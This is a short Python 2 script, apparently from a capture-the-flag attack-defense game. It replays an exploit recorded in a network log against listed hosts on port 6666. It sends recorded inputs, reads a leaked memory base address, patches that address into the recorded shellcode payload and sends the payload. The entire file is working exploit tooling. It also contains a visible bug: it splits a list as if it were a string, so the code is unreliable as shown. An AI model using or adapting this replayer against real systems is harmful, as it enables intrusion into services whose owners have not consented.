#!/usr/bin/env python

from zio import *


def get_base(buf, pat, tag):
    bt = 6 if tag == 'x64' else 4
    pos = pat.find('{{base}}')
    base = int(buf[pos:pos+bt][::-1].encode('hex'), 16)
    return base


def make_shellcode(line, base, offset, tag):
    pad = '\x00\x00' if tag == 'x64' else ''
    for item in offset:
        addr = hex(base + int(item, 16))[2:].decode('hex')[::-1] + pad
        line = line.replace('#%s#' % item, addr)
    return line


filename = '6666->51132.105855.log'
ips = ['127.0.0.1']
port = 6666


if __name__ == '__main__':
    content = open(filename).readlines()
    tag = content[0].strip()
    offset = content[1].strip().split()
    buf = ''
    presc, basepat, scpat = content[2:].split('--------\n')
    for ip in ips:
        io = zio((ip, port), print_write=False, print_read=False)
        for item in presc:
            io.read_until_timeout(0.01)
            io.write(item)
            print item
        buf = io.read_until_timeout(0.05)        # read exposed base
        base = get_base(buf, basepat, tag)
        for item in scpat:
            io.read_until_timeout(0.01)
            io.write(make_shellcode(item, base, offset, tag))
        print io.read()
